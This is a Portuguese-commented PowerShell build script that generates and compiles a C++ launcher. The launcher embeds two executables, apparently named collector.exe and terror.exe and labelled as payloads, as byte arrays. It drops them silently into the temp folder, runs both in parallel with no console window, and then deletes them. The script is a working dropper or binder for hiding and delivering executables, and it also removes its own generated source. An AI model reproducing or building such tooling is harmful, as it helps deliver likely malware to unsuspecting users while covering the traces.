# build.ps1 - Gera launcher.cpp com os EXEs embutidos e compila
# Uso: .\build.ps1 [nome-do-output] (padrao: launcher)

param(
    [string]$OutputName = "launcher"
)

$ErrorActionPreference = "Stop"
$workDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$cppFile = "$workDir\launcher_gen.cpp"
$outExe  = "$workDir\$OutputName.exe"

Write-Host ""
Write-Host "=== EXE Launcher Builder ===" -ForegroundColor Cyan
Write-Host ""

# 1. Verifica arquivos de entrada
$bin1 = "$workDir\collector.exe"
$bin2 = "$workDir\terror.exe"

foreach ($f in @($bin1, $bin2)) {
    if (-not (Test-Path $f)) {
        Write-Host "[ERRO] Arquivo nao encontrado: $f" -ForegroundColor Red
        exit 1
    }
}

Write-Host "[1/4] Lendo binarios..." -ForegroundColor Yellow
$bytes1 = [System.IO.File]::ReadAllBytes($bin1)
$bytes2 = [System.IO.File]::ReadAllBytes($bin2)
Write-Host "      collector.exe : $([math]::Round($bytes1.Length/1KB,1)) KB" -ForegroundColor Gray
Write-Host "      terror.exe    : $([math]::Round($bytes2.Length/1KB,1)) KB" -ForegroundColor Gray

# 2. Converte bytes -> array C++
function ConvertTo-CArray {
    param([byte[]]$data, [string]$varName)

    $sb = [System.Text.StringBuilder]::new()
    $null = $sb.AppendLine("static const unsigned char ${varName}_data[] = {")

    $lineSize = 16
    for ($i = 0; $i -lt $data.Length; $i += $lineSize) {
        $end   = [Math]::Min($i + $lineSize, $data.Length)
        $chunk = ($data[$i..($end-1)] | ForEach-Object { "0x{0:X2}" -f $_ }) -join ","
        if ($end -lt $data.Length) { $chunk += "," }
        $null = $sb.AppendLine("    $chunk")
    }

    $null = $sb.AppendLine("};")
    $null = $sb.AppendLine("static const size_t ${varName}_size = $($data.Length);")
    return $sb.ToString()
}

Write-Host "[2/4] Gerando codigo C++..." -ForegroundColor Yellow

$arr1 = ConvertTo-CArray $bytes1 "payload1"
$arr2 = ConvertTo-CArray $bytes2 "payload2"

# 3. Monta o launcher_gen.cpp
# Nota: usamos aspas simples nas linhas C++ que contem " para evitar conflito com PowerShell
$L = [System.Collections.Generic.List[string]]::new()

$L.Add('/*')
$L.Add(' * launcher_gen.cpp - Auto-gerado por build.ps1')
$L.Add(' * Embeds: collector.exe + terror.exe')
$L.Add(' * Executa em PARALELO (ambos ao mesmo tempo).')
$L.Add(' */')
$L.Add('')
$L.Add('#ifndef WIN32_LEAN_AND_MEAN')
$L.Add('#define WIN32_LEAN_AND_MEAN')
$L.Add('#endif')
$L.Add('#include <windows.h>')
$L.Add('#include <string>')
$L.Add('#include <fstream>')
$L.Add('#include <cstddef>')
$L.Add('')

# Insere os arrays de bytes (precisam de interpolacao de variavel)
$L.Add($arr1)
$L.Add($arr2)

# Funcao: escreve o payload em disco e retorna o caminho
$L.Add('static std::string drop_file(const unsigned char* data, size_t size, const char* filename)')
$L.Add('{')
$L.Add('    char tmp[MAX_PATH];')
$L.Add('    if (GetTempPathA(MAX_PATH, tmp) == 0) return std::string();')
$L.Add('    std::string path = std::string(tmp) + filename;')
$L.Add('    std::ofstream out(path, std::ios::binary);')
$L.Add('    if (!out.is_open()) return std::string();')
$L.Add('    out.write(reinterpret_cast<const char*>(data), (std::streamsize)size);')
$L.Add('    return path;')
$L.Add('}')
$L.Add('')

# Entry point
$L.Add('int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)')
$L.Add('{')
$L.Add('    // 1. Extrai os dois EXEs para a pasta temp')
$L.Add('    std::string path1 = drop_file(payload1_data, payload1_size, "collector.exe");')
$L.Add('    std::string path2 = drop_file(payload2_data, payload2_size, "terror.exe");')
$L.Add('    if (path1.empty() || path2.empty()) return 1;')
$L.Add('')
$L.Add('    // 2. Lanca os dois processos AO MESMO TEMPO')
$L.Add('    STARTUPINFOA        si1 = {}, si2 = {};')
$L.Add('    PROCESS_INFORMATION pi1 = {}, pi2 = {};')
$L.Add('    si1.cb = sizeof(si1);')
$L.Add('    si2.cb = sizeof(si2);')
$L.Add('')
$L.Add('    BOOL ok1 = CreateProcessA(path1.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si1, &pi1);')
$L.Add('    BOOL ok2 = CreateProcessA(path2.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si2, &pi2);')
$L.Add('')
$L.Add('    // 3. Aguarda AMBOS terminarem (WaitForMultipleObjects)')
$L.Add('    HANDLE handles[2];')
$L.Add('    DWORD  count = 0;')
$L.Add('    if (ok1) handles[count++] = pi1.hProcess;')
$L.Add('    if (ok2) handles[count++] = pi2.hProcess;')
$L.Add('    if (count > 0) WaitForMultipleObjects(count, handles, TRUE, INFINITE);')
$L.Add('')
$L.Add('    // 4. Fecha handles e remove os temporarios')
$L.Add('    if (ok1) { CloseHandle(pi1.hProcess); CloseHandle(pi1.hThread); }')
$L.Add('    if (ok2) { CloseHandle(pi2.hProcess); CloseHandle(pi2.hThread); }')
$L.Add('    DeleteFileA(path1.c_str());')
$L.Add('    DeleteFileA(path2.c_str());')
$L.Add('    return 0;')
$L.Add('}')
$L.Add('')

[System.IO.File]::WriteAllLines($cppFile, $L, [System.Text.UTF8Encoding]::new($false))

$srcSizeKB = [math]::Round((Get-Item $cppFile).Length / 1KB, 0)
Write-Host "      Arquivo gerado: launcher_gen.cpp ($srcSizeKB KB)" -ForegroundColor Gray

# 4. Compila
Write-Host "[3/4] Compilando..." -ForegroundColor Yellow

$compiled = $false

# Tenta g++ (MinGW)
$gpp = Get-Command "g++" -ErrorAction SilentlyContinue
if ($gpp) {
    Write-Host "      Usando: g++ (MinGW)" -ForegroundColor Gray
    $result = & g++ -O2 -std=c++17 -o $outExe $cppFile -lkernel32 -mwindows -static -static-libgcc -static-libstdc++ 2>&1
    if ($LASTEXITCODE -eq 0) {
        $compiled = $true
    } else {
        Write-Host "[AVISO] g++ falhou:" -ForegroundColor DarkYellow
        Write-Host $result -ForegroundColor DarkYellow
        Write-Host "        Tentando cl.exe..." -ForegroundColor DarkYellow
    }
}

# Tenta cl.exe (MSVC)
if (-not $compiled) {
    $cl = Get-Command "cl.exe" -ErrorAction SilentlyContinue
    if ($cl) {
        Write-Host "      Usando: cl.exe (MSVC)" -ForegroundColor Gray
        $result = & cl.exe /O2 /EHsc /std:c++17 $cppFile "/Fe:$outExe" /link kernel32.lib /SUBSYSTEM:WINDOWS 2>&1
        if ($LASTEXITCODE -eq 0) { $compiled = $true }
        else { Write-Host $result -ForegroundColor DarkYellow }
    }
}

if (-not $compiled) {
    Write-Host ""
    Write-Host "[ERRO] Nenhum compilador encontrado (g++ ou cl.exe)." -ForegroundColor Red
    Write-Host "       Instale MinGW: https://winlibs.com" -ForegroundColor DarkRed
    Write-Host "       Ou MSVC Build Tools: https://aka.ms/vs/buildtools" -ForegroundColor DarkRed
    exit 1
}

# 5. Resultado
Write-Host "[4/4] Limpando arquivos temporarios..." -ForegroundColor Yellow
Remove-Item $cppFile -Force -ErrorAction SilentlyContinue

$sizeMB = [math]::Round((Get-Item $outExe).Length / 1MB, 2)
Write-Host ""
Write-Host "+--------------------------------------------------+" -ForegroundColor Green
Write-Host "| SUCESSO! $OutputName.exe criado ($sizeMB MB)" -ForegroundColor Green
Write-Host "| Contem:  collector.exe + terror.exe              |" -ForegroundColor Green
Write-Host "| Executa: collector.exe || terror.exe (paralelo)  |" -ForegroundColor Green
Write-Host "+--------------------------------------------------+" -ForegroundColor Green
Write-Host ""
